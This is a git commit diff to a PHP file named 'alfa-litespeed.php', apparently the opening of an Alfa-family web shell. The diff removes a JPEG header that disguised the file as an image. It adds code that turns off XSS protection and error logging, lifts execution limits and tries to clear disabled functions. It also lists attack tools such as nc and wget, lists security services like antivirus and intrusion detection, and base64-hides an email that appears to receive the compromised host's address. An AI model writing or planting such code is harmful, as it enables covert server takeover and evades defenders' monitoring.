dc11dbffa0068dbc341f9cc88485842770d996e5
Anonrocks <52328375+Anonrocks@users.noreply.github.com>
2024-09-19 18:53:46 +0700

    Update alfa-litespeed.php

--- alfa-litespeed.php
+++ alfa-litespeed.php
@@ -1,5 +1,28 @@
-ÿØÿà JFIF ÿþ;  
-<?php
+<?pHp
+header("X-XSS-Protection: 0");
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', FALSE);
+@ini_set('max_execution_time', 5000);
+@clearstatcache();
+@mb_internal_encoding('UTF-8');
+ini_set('memory_limit', '-1');
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', NONE);
+ini_set('disable_functions', 0);
+ini_set('max_execution_time', 5000);
+@ini_set('display_errors', 0);
+@ini_set('disable_functions', 0);
+error_reporting(E_ALL);
+//@ignore_user_abort(TRUE);
+@set_time_limit(0);
+@set_magic_quotes_runtime(0);
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+$allow_ext		= array('mysql','mysqli','ftp','curl','imap','sockets','mssql','sqlite');
+$allow_program	= array('gcc','cc','ld','php','perl','python','ruby','make','tar','nc','locate','suidperl','wget','get','fetch','links','lynx','curl','lwp-mirror','lwp-download');
+$allow_service	= array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','tripwire','sxid','logcheck','logwatch');
 $e=base64_decode("bXVocmF6a3lAZ21haWwuY29t");
 $f=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
 $f=$_SERVER['PATH_INFO'].$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
